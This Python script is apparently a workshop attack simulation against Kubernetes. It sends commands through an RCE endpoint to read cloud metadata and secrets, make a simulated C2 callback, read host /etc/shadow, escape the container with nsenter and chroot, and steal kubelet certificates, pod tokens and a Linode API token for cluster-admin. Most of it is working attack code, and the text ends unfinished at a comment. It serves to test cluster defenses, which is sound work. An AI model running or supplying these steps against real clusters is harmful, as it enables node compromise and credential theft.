#!/usr/bin/env python3
"""
Kubernetes Attack Simulation - Day 2
Theme: "The Attacker is ESCAPING Your Pod"

This script demonstrates attacks that will be blocked by:
- Day 1: NetworkPolicy (metadata access, external egress), RBAC (secret access)
- Day 2: PSS Restricted (container escape)

Day 2 re-runs all Day 1 attacks, then runs Day 2-specific container escape attacks.

Usage:
    python3 attack_day2.py --rce-url http://<phoenix-endpoint>/<secret-path>/
"""

import requests
import argparse
import json
import sys
import re
import base64
import urllib3

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ==================== CONFIGURATION ====================

RCE_URL = None
NAMESPACE = "production"


# ==================== COLORS & FORMATTING ====================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'


def banner():
    """Print the main banner"""
    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════╗
║{Colors.WHITE}{Colors.BOLD}        KUBERNETES ATTACK SIMULATION - DAY 2               {Colors.RED}║
║{Colors.YELLOW}        "The Attacker is ESCAPING Your Pod"                {Colors.RED}║
╚═══════════════════════════════════════════════════════════╝{Colors.RESET}
""")


def section_header(title):
    """Print a section header"""
    print(f"""
{Colors.MAGENTA}══════════════════════════════════════════════════════════════
 {title}
══════════════════════════════════════════════════════════════{Colors.RESET}
""")


def print_attack_header(num, total, name, description):
    """Print attack section header"""
    print(f"\n{Colors.CYAN}[{num}/{total}] {Colors.BOLD}{name}{Colors.RESET}")
    print(f"{Colors.DIM}      {description}{Colors.RESET}")
    print(f"{Colors.DIM}      {'─' * 52}{Colors.RESET}")


def print_command(cmd):
    """Print the command being executed"""
    # Truncate long commands
    display_cmd = cmd.strip().replace('\n', ' ')
    if len(display_cmd) > 70:
        display_cmd = display_cmd[:67] + "..."
    print(f"{Colors.DIM}      $ {display_cmd}{Colors.RESET}")


def success(msg, details=None):
    """Print success message"""
    print(f"\n{Colors.GREEN}      ✅ ATTACK SUCCEEDED{Colors.RESET}")
    print(f"{Colors.GREEN}      → {msg}{Colors.RESET}")
    if details:
        for detail in details:
            print(f"{Colors.GREEN}      → {detail}{Colors.RESET}")


def blocked(msg, details=None):
    """Print blocked message"""
    print(f"\n{Colors.RED}      ❌ ATTACK BLOCKED{Colors.RESET}")
    print(f"{Colors.RED}      → {msg}{Colors.RESET}")
    if details:
        for detail in details:
            print(f"{Colors.RED}      → {detail}{Colors.RESET}")


def info(msg):
    """Print info message"""
    print(f"{Colors.YELLOW}      ℹ {msg}{Colors.RESET}")


def print_summary(results):
    """Print final summary for Day 2"""
    total = len(results)
    succeeded = sum(1 for r in results if r['success'])
    failed = total - succeeded

    if succeeded == 0:
        status = f"{Colors.GREEN}🟢 DAY 2 HARDENED{Colors.RESET}"
        status_msg = "All container escape attacks blocked!"
    elif succeeded == total:
        status = f"{Colors.RED}🔴 FULLY VULNERABLE{Colors.RESET}"
        status_msg = "Container escape possible!"
    else:
        status = f"{Colors.YELLOW}🟡 PARTIALLY HARDENED{Colors.RESET}"
        status_msg = "Some Day 2 defenses in place"

    print(f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════╗
║{Colors.WHITE}{Colors.BOLD}                        SUMMARY                            {Colors.RED}║
╠═══════════════════════════════════════════════════════════╣{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {Colors.GREEN}✅ Blocked attacks:{Colors.RESET}    {failed:>2}/{total:<27}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {Colors.RED}❌ Successful attacks:{Colors.RESET} {succeeded:>2}/{total:<27}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  Status: {status:<49}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}  {status_msg:<57}{Colors.RED}║{Colors.RESET}
{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}""")

    # Show what's still vulnerable
    vulnerable = [r['name'] for r in results if r['success']]
    if vulnerable:
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}Still vulnerable to:{Colors.RESET}                                    {Colors.RED}║{Colors.RESET}")
        for v in vulnerable[:5]:
            print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}• {v:<55}{Colors.RESET}{Colors.RED}║{Colors.RESET}")
        if len(vulnerable) > 5:
            print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}• ... and {len(vulnerable) - 5} more{Colors.RESET}                                        {Colors.RED}║{Colors.RESET}")

    # Show defenses needed
    if succeeded > 0:
        print(f"{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}Apply Day 2 defenses:{Colors.RESET}                                  {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}• PSS Restricted (blocks container escape){Colors.RESET}             {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.CYAN}• Remove hostPath, hostPID, hostNetwork, privileged{Colors.RESET}    {Colors.RED}║{Colors.RESET}")

    if succeeded == 0:
        print(f"{Colors.RED}║{Colors.RESET}                                                           {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.GREEN}✅ Day 2 defenses working!{Colors.RESET}                             {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}⚠️  Still vulnerable to Day 3 attacks:{Colors.RESET}                 {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}• Lateral movement (no service mesh){Colors.RESET}                  {Colors.RED}║{Colors.RESET}")
        print(f"{Colors.RED}║{Colors.RESET}  {Colors.YELLOW}• Runtime attacks (no Tetragon){Colors.RESET}                       {Colors.RED}║{Colors.RESET}")

    print(f"{Colors.RED}╚═══════════════════════════════════════════════════════════╝{Colors.RESET}")


# ==================== RCE HELPER ====================

def html_unescape(text):
    """Unescape HTML entities"""
    text = text.replace('&gt;', '>')
    text = text.replace('&lt;', '<')
    text = text.replace('&amp;', '&')
    text = text.replace('&#39;', "'")
    text = text.replace('&#34;', '"')
    text = text.replace('&quot;', '"')
    return text


def rce(cmd):
    """
    Execute command via RCE endpoint, return output.
    Parses HTML response to extract command output.
    """
    try:
        response = requests.post(
            RCE_URL,
            data={"cmd": cmd},
            timeout=30,
            verify=False
        )

        # Parse output from HTML response
        # Format: <pre>$ cmd\noutput</pre>
        html = response.text

        # Extract content between <pre> tags
        match = re.search(r'<pre>(.*?)</pre>', html, re.DOTALL)
        if match:
            content = match.group(1)
            # Unescape HTML entities
            content = html_unescape(content)
            # Remove the first line ($ command)
            lines = content.split('\n', 1)
            if len(lines) > 1:
                return lines[1].strip()
            return ""
        return html

    except requests.exceptions.Timeout:
        return "ERROR: Connection timeout"
    except requests.exceptions.ConnectionError:
        return "ERROR: Connection failed"
    except Exception as e:
        return f"ERROR: {str(e)}"


# ==================== DAY 1 ATTACKS ====================

def attack_cloud_metadata(attack_num, total):
    """Access Linode IMDS to steal instance metadata"""
    name = "Cloud Metadata Access"
    description = "Steal instance metadata from Linode IMDS (169.254.169.254)"

    print_attack_header(attack_num, total, name, description)

    # Linode uses IMDSv2-style tokens - single line command
    cmd = 'TOKEN=$(curl -s -X PUT -H "Metadata-Token-Expiry-Seconds: 3600" http://169.254.169.254/v1/token 2>/dev/null) && curl -s -H "Metadata-Token: $TOKEN" http://169.254.169.254/v1/instance 2>/dev/null'
    print_command("curl http://169.254.169.254/v1/instance")

    output = rce(cmd)

    if "ERROR:" in output or not output or "timed out" in output.lower():
        blocked("Metadata service not accessible", ["NetworkPolicy blocking metadata endpoint"])
        return {"name": name, "success": False}
    elif "id" in output or "region" in output or "label" in output:
        try:
            data = json.loads(output) if output.startswith('{') else {}
            details = []
            if 'id' in data:
                details.append(f"Instance ID: {data['id']}")
            if 'region' in data:
                details.append(f"Region: {data['region']}")
            if 'label' in data:
                details.append(f"Label: {data['label']}")
            success("Retrieved Linode instance metadata", details or None)
        except:
            success("Retrieved instance metadata", [output[:100] + "..." if len(output) > 100 else output])
        return {"name": name, "success": True}
    else:
        blocked("Metadata service not accessible")
        return {"name": name, "success": False}


def attack_secrets_list(attack_num, total):
    """List K8s secrets in production namespace"""
    name = "K8s Secrets List"
    description = "List all secrets in production namespace via K8s API"

    print_attack_header(attack_num, total, name, description)

    cmd = 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && [ -n "$TOKEN" ] && curl -sk -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/production/secrets" 2>/dev/null || echo "NO_TOKEN"'
    print_command("curl -sk https://$K8S_API/api/v1/namespaces/production/secrets")

    output = rce(cmd)

    if "NO_TOKEN" in output:
        blocked("Service account token not found", ["Token may be disabled"])
        return {"name": name, "success": False}
    elif "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to secrets", ["RBAC policy blocking secret access"])
        return {"name": name, "success": False}
    elif '"items"' in output or '"secrets"' in output.lower():
        try:
            data = json.loads(output)
            items = data.get('items', [])
            secret_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(secret_names)} secrets", [f"Names: {', '.join(secret_names[:5])}{'...' if len(secret_names) > 5 else ''}"])
        except:
            success("Retrieved secrets list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list secrets", [output[:80] if output else "No response"])
        return {"name": name, "success": False}


def attack_read_secret(secret_name, attack_num, total, friendly_name, expected_keys):
    """Generic function to read a specific secret"""
    name = f"Read {friendly_name}"
    description = f"Extract {friendly_name} from K8s secret '{secret_name}'"

    print_attack_header(attack_num, total, name, description)

    cmd = f'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/production/secrets/{secret_name}" 2>/dev/null'
    print_command(f"curl -sk https://$K8S_API/.../secrets/{secret_name}")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked(f"Access denied to {secret_name}", ["RBAC policy blocking secret access"])
        return {"name": name, "success": False}
    elif "not found" in output.lower():
        blocked(f"Secret '{secret_name}' not found")
        return {"name": name, "success": False}
    elif '"data"' in output:
        try:
            data = json.loads(output)
            secret_data = data.get('data', {})
            details = []
            for key in expected_keys:
                if key in secret_data:
                    try:
                        decoded = base64.b64decode(secret_data[key]).decode('utf-8')
                        if len(decoded) > 30:
                            details.append(f"{key}: {decoded[:30]}...")
                        else:
                            details.append(f"{key}: {decoded}")
                    except:
                        details.append(f"{key}: <base64 encoded>")
            success(f"Extracted {friendly_name}", details or [f"Found {len(secret_data)} keys"])
        except:
            success(f"Retrieved secret data")
        return {"name": name, "success": True}
    else:
        blocked(f"Could not read secret")
        return {"name": name, "success": False}


def attack_read_secret_apikeys(attack_num, total):
    return attack_read_secret("api-keys", attack_num, total, "API Keys",
        ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "GITHUB_TOKEN", "STRIPE_SECRET_KEY"])


def attack_read_secret_dbcreds(attack_num, total):
    return attack_read_secret("database-credentials", attack_num, total, "Database Credentials",
        ["username", "password", "connection_string", "DATABASE_URL"])


def attack_read_secret_webhook(attack_num, total):
    return attack_read_secret("webhookapikey", attack_num, total, "Webhook API Key",
        ["apikey", "key", "token", "WEBHOOK_KEY"])


def attack_list_pods(attack_num, total):
    """List pods in production namespace"""
    name = "List Pods"
    description = "Enumerate all pods in production namespace"

    print_attack_header(attack_num, total, name, description)

    cmd = 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/production/pods" 2>/dev/null'
    print_command("curl -sk https://$K8S_API/api/v1/namespaces/production/pods")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to pods", ["RBAC policy blocking pod listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            pod_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(pod_names)} pods", [f"Names: {', '.join(pod_names[:3])}{'...' if len(pod_names) > 3 else ''}"])
        except:
            success("Retrieved pod list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list pods")
        return {"name": name, "success": False}


def attack_list_services(attack_num, total):
    """List services in cluster"""
    name = "List Services"
    description = "Enumerate services in cluster"

    print_attack_header(attack_num, total, name, description)

    cmd = 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/production/services" 2>/dev/null'
    print_command("curl -sk https://$K8S_API/api/v1/namespaces/production/services")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to services", ["RBAC policy blocking service listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            svc_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(svc_names)} services", [f"Names: {', '.join(svc_names[:5])}"])
        except:
            success("Retrieved service list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list services")
        return {"name": name, "success": False}


def attack_list_deployments(attack_num, total):
    """List deployments in production namespace"""
    name = "List Deployments"
    description = "Enumerate deployments to understand application architecture"

    print_attack_header(attack_num, total, name, description)

    cmd = 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/apis/apps/v1/namespaces/production/deployments" 2>/dev/null'
    print_command("curl -sk https://$K8S_API/apis/apps/v1/.../deployments")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to deployments", ["RBAC policy blocking deployment listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            details = []
            for item in items[:3]:
                dep_name = item['metadata']['name']
                replicas = item['spec'].get('replicas', '?')
                image = item['spec']['template']['spec']['containers'][0]['image']
                details.append(f"{dep_name}: {replicas} replica(s), {image.split('/')[-1]}")
            success(f"Found {len(items)} deployments", details)
        except:
            success("Retrieved deployment list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list deployments")
        return {"name": name, "success": False}


def attack_list_endpoints(attack_num, total):
    """List endpoints to discover pod IPs"""
    name = "List Endpoints"
    description = "Discover internal pod IPs via endpoint enumeration"

    print_attack_header(attack_num, total, name, description)

    cmd = 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/production/endpoints" 2>/dev/null'
    print_command("curl -sk https://$K8S_API/api/v1/.../endpoints")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to endpoints", ["RBAC policy blocking endpoint listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            details = []
            for item in items[:3]:
                ep_name = item['metadata']['name']
                subsets = item.get('subsets', [])
                if subsets and 'addresses' in subsets[0]:
                    ips = [addr['ip'] for addr in subsets[0]['addresses'][:2]]
                    details.append(f"{ep_name}: {', '.join(ips)}")
            success(f"Found {len(items)} endpoints with internal IPs", details)
        except:
            success("Retrieved endpoint list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list endpoints")
        return {"name": name, "success": False}


def attack_list_configmaps(attack_num, total):
    """List configmaps which may contain sensitive configuration"""
    name = "List ConfigMaps"
    description = "Enumerate configmaps for sensitive configuration data"

    print_attack_header(attack_num, total, name, description)

    cmd = 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H "Authorization: Bearer $TOKEN" "https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/production/configmaps" 2>/dev/null'
    print_command("curl -sk https://$K8S_API/api/v1/.../configmaps")

    output = rce(cmd)

    if "Forbidden" in output or "forbidden" in output:
        blocked("Access denied to configmaps", ["RBAC policy blocking configmap listing"])
        return {"name": name, "success": False}
    elif '"items"' in output:
        try:
            data = json.loads(output)
            items = data.get('items', [])
            cm_names = [item['metadata']['name'] for item in items]
            success(f"Found {len(cm_names)} configmaps", [f"Names: {', '.join(cm_names[:5])}"])
        except:
            success("Retrieved configmap list")
        return {"name": name, "success": True}
    else:
        blocked("Could not list configmaps")
        return {"name": name, "success": False}


def attack_cnc_communication(attack_num, total):
    """Simulate C2/CNC server communication - data exfiltration"""
    name = "C2 Server Communication"
    description = "Simulate command & control server callback (data exfiltration)"

    print_attack_header(attack_num, total, name, description)

    cmd = 'curl -s --connect-timeout 5 -H "User-Agent: Mozilla/5.0" https://ipinfo.io/json 2>/dev/null || echo "EGRESS_BLOCKED"'
    print_command("curl -s https://ipinfo.io/json  # (simulated C2 callback)")

    output = rce(cmd)

    if "EGRESS_BLOCKED" in output or "ERROR:" in output or not output or "timed out" in output.lower():
        blocked("C2 communication blocked", ["NetworkPolicy blocking outbound traffic", "Cannot exfiltrate data"])
        return {"name": name, "success": False}
    elif '"ip"' in output or '"city"' in output:
        try:
            data = json.loads(output)
            details = [
                f"External IP: {data.get('ip', 'unknown')}",
                f"Location: {data.get('city', '?')}, {data.get('region', '?')}, {data.get('country', '?')}",
                f"Org: {data.get('org', 'unknown')}"
            ]
            success("C2 callback successful - can exfiltrate data!", details)
        except:
            success("C2 callback successful - outbound access confirmed")
        return {"name": name, "success": True}
    else:
        blocked("C2 communication blocked", [output[:50] if output else "No response"])
        return {"name": name, "success": False}


# ==================== DAY 2 ATTACKS ====================


def attack_privileged_check(attack_num, total):
    """Check if container has elevated capabilities"""
    name = "Privileged Container Check"
    description = "Check container capabilities (privileged = all caps)"

    print_attack_header(attack_num, total, name, description)

    cmd = 'cat /proc/self/status 2>/dev/null | grep -E "^Cap(Eff|Prm):" || echo "NO_CAPS"'
    print_command("cat /proc/self/status | grep Cap")

    output = rce(cmd)

    if "NO_CAPS" in output or not output:
        blocked("Cannot read capability info")
        return {"name": name, "success": False}

    # Check if CapEff shows elevated capabilities
    # Privileged container: CapEff: 000001ffffffffff (or similar high value)
    # Restricted: CapEff: 0000000000000000 or very low value
    if "CapEff:" in output:
        cap_match = re.search(r'CapEff:\s*([0-9a-f]+)', output, re.IGNORECASE)
        if cap_match:
            cap_hex = cap_match.group(1)
            cap_int = int(cap_hex, 16)

            # If more than basic capabilities (e.g., > 0x00000000a80425fb is suspicious)
            # A truly privileged container would have 0x1ffffffffff or similar
            if cap_int > 0x0000003fffffffff:  # Very high caps = privileged
                success("Container is PRIVILEGED", [
                    f"CapEff: {cap_hex}",
                    "Has all Linux capabilities - can escape container!"
                ])
                return {"name": name, "success": True}
            elif cap_int > 0:
                # Has some capabilities but not fully privileged
                info(f"Container has limited caps: {cap_hex}")
                blocked("Container not fully privileged", ["PSS Restricted limiting capabilities"])
                return {"name": name, "success": False}

    blocked("Container running with minimal capabilities", ["PSS Restricted enforced"])
    return {"name": name, "success": False}


def attack_host_filesystem(attack_num, total):
    """Read /etc/shadow from host via hostPath mount"""
    name = "Host Filesystem Access"
    description = "Read /etc/shadow from host via hostPath mount at /host"

    print_attack_header(attack_num, total, name, description)

    cmd = 'cat /host/etc/shadow 2>/dev/null | head -3 || echo "NO_ACCESS"'
    print_command("cat /host/etc/shadow")

    output = rce(cmd)

    if "NO_ACCESS" in output or "No such file" in output or not output:
        blocked("Cannot access host filesystem", ["hostPath volume not mounted", "PSS Restricted blocks hostPath"])
        return {"name": name, "success": False}
    elif "root:" in output or ":" in output:
        # Got shadow file content
        lines = output.strip().split('\n')
        success("Host filesystem accessible!", [
            f"Read {len(lines)} lines from /etc/shadow",
            "Can read/modify any host file!"
        ])
        return {"name": name, "success": True}
    else:
        blocked("Cannot access host filesystem")
        return {"name": name, "success": False}


def attack_escape_nsenter(attack_num, total):
    """Container escape using nsenter"""
    name = "Container Escape (nsenter)"
    description = "Break out to host using nsenter (requires hostPID + privileged)"

    print_attack_header(attack_num, total, name, description)

    cmd = 'nsenter -t 1 -m -u -i -n -p -- whoami 2>/dev/null || echo "ESCAPE_FAILED"'
    print_command("nsenter -t 1 -m -u -i -n -p -- whoami")

    output = rce(cmd)

    if "ESCAPE_FAILED" in output or "permission denied" in output.lower() or "operation not permitted" in output.lower():
        blocked("Container escape failed", ["hostPID not enabled or not privileged", "PSS Restricted blocks this"])
        return {"name": name, "success": False}
    elif "root" in output.lower():
        success("CONTAINER ESCAPE SUCCESSFUL!", [
            "Broke out to host namespace",
            "Running as root on the node!",
            "Full node compromise achieved"
        ])
        return {"name": name, "success": True}
    else:
        blocked("Container escape failed", [output[:50] if output else "Unknown error"])
        return {"name": name, "success": False}


def attack_escape_chroot(attack_num, total):
    """Container escape using chroot"""
    name = "Container Escape (chroot)"
    description = "Break out to host using chroot /host (requires hostPath to /)"

    print_attack_header(attack_num, total, name, description)

    cmd = 'chroot /host whoami 2>/dev/null || echo "ESCAPE_FAILED"'
    print_command("chroot /host whoami")

    output = rce(cmd)

    if "ESCAPE_FAILED" in output or "No such file" in output or not output:
        blocked("chroot escape failed", ["hostPath not mounted", "PSS Restricted blocks hostPath"])
        return {"name": name, "success": False}
    elif "root" in output.lower():
        success("CHROOT ESCAPE SUCCESSFUL!", [
            "Escaped to host root filesystem",
            "Can execute host binaries as root"
        ])
        return {"name": name, "success": True}
    else:
        blocked("chroot escape failed")
        return {"name": name, "success": False}


def attack_host_processes(attack_num, total):
    """View host processes via hostPID"""
    name = "Host Process Visibility"
    description = "View host processes via hostPID namespace sharing"

    print_attack_header(attack_num, total, name, description)

    # Check if PID 1 is the host's init (not container entrypoint)
    cmd = 'cat /proc/1/comm 2>/dev/null && ps aux 2>/dev/null | head -10 || echo "NO_PS"'
    print_command("cat /proc/1/comm && ps aux | head -10")

    output = rce(cmd)

    if "NO_PS" in output or not output:
        blocked("Cannot list processes")
        return {"name": name, "success": False}

    # If PID 1 is init/systemd, we have hostPID
    # Container PID 1 would be python/flask/node/etc.
    first_line = output.strip().split('\n')[0] if output else ""
    host_init_indicators = ['init', 'systemd', 'launchd']

    if any(ind in first_line.lower() for ind in host_init_indicators):
        success("Can see HOST processes!", [
            f"PID 1 is '{first_line}' (host init process)",
            "hostPID: true is enabled",
            "Can monitor/attack ALL host processes"
        ])
        return {"name": name, "success": True}
    else:
        blocked("Only container processes visible", [f"PID 1 is '{first_line}'", "hostPID not enabled"])
        return {"name": name, "success": False}


def attack_kubelet_creds(attack_num, total):
    """Steal kubelet client certificate"""
    name = "Kubelet Credentials Theft"
    description = "Steal kubelet client certificate for node impersonation"

    print_attack_header(attack_num, total, name, description)

    # The symlink kubelet-client-current.pem points to relative path, so we need to find the actual file
    cmd = 'cat /host/var/lib/kubelet/pki/kubelet-client-2*.pem 2>/dev/null | head -5 || cat /host/var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null | head -5 || echo "NO_ACCESS"'
    print_command("cat /host/var/lib/kubelet/pki/kubelet-client-*.pem")

    output = rce(cmd)

    if "NO_ACCESS" in output or "No such file" in output or not output:
        blocked("Cannot access kubelet credentials", ["hostPath not mounted", "PSS Restricted blocks hostPath"])
        return {"name": name, "success": False}
    elif "BEGIN CERTIFICATE" in output or "BEGIN RSA" in output or "BEGIN PRIVATE" in output:
        success("Kubelet credentials stolen!", [
            "Got kubelet client certificate",
            "Can impersonate the node to K8s API",
            "Full node-level access!"
        ])
        return {"name": name, "success": True}
    else:
        blocked("Cannot access kubelet credentials")
        return {"name": name, "success": False}


def attack_token_theft(attack_num, total):
    """Steal SA tokens from other pods via host filesystem"""
    name = "Other Pods' Token Theft"
    description = "Steal service account tokens from other pods via hostPath"

    print_attack_header(attack_num, total, name, description)

    cmd = 'find /host/var/lib/kubelet/pods -name "token" 2>/dev/null | head -5 || echo "NO_ACCESS"'
    print_command("find /host/var/lib/kubelet/pods -name token")

    output = rce(cmd)

    if "NO_ACCESS" in output or "No such file" in output or not output:
        blocked("Cannot access other pods' tokens", ["hostPath not mounted", "PSS Restricted blocks hostPath"])
        return {"name": name, "success": False}
    elif "/token" in output:
        token_count = output.count("/token")
        success(f"Found {token_count} pod tokens!", [
            "Can steal other pods' SA tokens",
            "Lateral movement to other services possible"
        ])
        return {"name": name, "success": True}
    else:
        blocked("Cannot find other pods' tokens")
        return {"name": name, "success": False}


def attack_containerd_socket(attack_num, total):
    """Access containerd socket for container manipulation"""
    name = "containerd Socket Access"
    description = "Access container runtime socket for lateral movement"

    print_attack_header(attack_num, total, name, description)

    cmd = 'ls -la /host/run/containerd/containerd.sock 2>/dev/null || echo "NO_ACCESS"'
    print_command("ls -la /host/run/containerd/containerd.sock")

    output = rce(cmd)

    if "NO_ACCESS" in output or "No such file" in output or not output:
        blocked("Cannot access containerd socket", ["hostPath not mounted", "PSS Restricted blocks hostPath"])
        return {"name": name, "success": False}
    elif "containerd.sock" in output:
        success("containerd socket accessible!", [
            "Can control container runtime",
            "Can exec into ANY container on node",
            "Can steal secrets from other containers"
        ])
        return {"name": name, "success": True}
    else:
        blocked("Cannot access containerd socket")
        return {"name": name, "success": False}


def attack_linode_token(attack_num, total):
    """The Crown Jewel: Steal LINODE_TOKEN from csi-linode for cluster-admin"""
    name = "🔥 Linode Token → Cluster Admin"
    description = "Steal LINODE_TOKEN from csi-linode-controller for full cluster control"

    print_attack_header(attack_num, total, name, description)

    # Step 1: Find the Linode CSI driver process (/linode binary)
    # This runs as part of csi-linode-node DaemonSet and has LINODE_TOKEN env var
    # Use regex to find exact "/linode " to avoid matching csi-node-driver-registrar
    cmd1 = 'ps aux 2>/dev/null | grep -E "\\s/linode\\s" | head -1'
    print_command("ps aux | grep /linode")

    output1 = rce(cmd1)

    if not output1 or not output1.strip():
        blocked("Cannot find Linode CSI process", ["hostPID required to see host processes", "PSS Restricted blocks hostPID"])
        return {"name": name, "success": False}

    # Step 2: Extract PID from ps output (format: user PID ...)
    pid = None
    try:
        parts = output1.strip().split()
        if len(parts) > 1 and parts[1].isdigit():
            pid = parts[1]
    except:
        pass

    if not pid:
        blocked("Cannot parse Linode CSI PID", ["Unexpected output format"])
        return {"name": name, "success": False}

    info(f"Found Linode CSI process PID: {pid}")

    # Step 3: Read environment variables from /proc/PID/environ
    cmd2 = f'cat /proc/{pid}/environ 2>/dev/null | tr "\\0" "\\n" | grep LINODE_TOKEN || echo "NO_TOKEN"'
    print_command(f"cat /proc/{pid}/environ | grep LINODE_TOKEN")

    output2 = rce(cmd2)

    if "LINODE_TOKEN=" in output2:
        token_preview = output2.split("=")[1][:20] if "=" in output2 else "found"
        success("LINODE_TOKEN STOLEN!", [
            f"Token: {token_preview}...",
            "Can call Linode API to get kubeconfig",
            "Grants CLUSTER-ADMIN access!",
            "Game over - full cluster compromise"
        ])
        return {"name": name, "success": True}
    elif "NO_TOKEN" in output2:
        blocked("Linode CSI found but LINODE_TOKEN not in env", ["Token may be mounted differently"])
        return {"name": name, "success": False}
    else:
        blocked("Cannot read Linode CSI environment", ["Permission denied"])
        return {"name": name, "success": False}


# ==================== MAIN ====================

def main():
    global RCE_URL

    parser = argparse.ArgumentParser(
        description='Kubernetes Attack Simulation - Day 2',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 attack_day2.py --rce-url http://phoenix.example.com/debug/
  python3 attack_day2.py --rce-url http://10.0.0.5:8080/secret123/
        """
    )
    parser.add_argument(
        '--rce-url',
        required=True,
        help='RCE endpoint URL (e.g., http://host/<secret-path>/)'
    )

    args = parser.parse_args()
    RCE_URL = args.rce_url.rstrip('/') + '/'

    # Print banner
    banner()

    print(f"{Colors.DIM}Target: {RCE_URL}{Colors.RESET}")
    print(f"{Colors.DIM}Testing connection...{Colors.RESET}")

    # Test connection
    test_output = rce("echo CONNECTION_OK")
    if "CONNECTION_OK" not in test_output:
        print(f"\n{Colors.RED}ERROR: Could not connect to RCE endpoint{Colors.RESET}")
        print(f"{Colors.RED}Response: {test_output[:100]}{Colors.RESET}")
        sys.exit(1)

    print(f"{Colors.GREEN}Connected successfully!{Colors.RESET}")

    # Day 2 has 9 attacks focused on container escape & node compromise
    # (hostNetwork moved to Day 1 since it's blocked by removing hostNetwork for NetworkPolicy)
    TOTAL_ATTACKS = 9

    results = []

    # Run Day 2 attacks
    results.append(attack_privileged_check(1, TOTAL_ATTACKS))
    results.append(attack_host_filesystem(2, TOTAL_ATTACKS))
    results.append(attack_escape_nsenter(3, TOTAL_ATTACKS))
    results.append(attack_escape_chroot(4, TOTAL_ATTACKS))
    results.append(attack_host_processes(5, TOTAL_ATTACKS))
    results.append(attack_kubelet_creds(6, TOTAL_ATTACKS))
    results.append(attack_token_theft(7, TOTAL_ATTACKS))
    results.append(attack_containerd_socket(8, TOTAL_ATTACKS))
    results.append(attack_linode_token(9, TOTAL_ATTACKS))

    # Print summary
    print_summary(results)

    # Exit with appropriate code
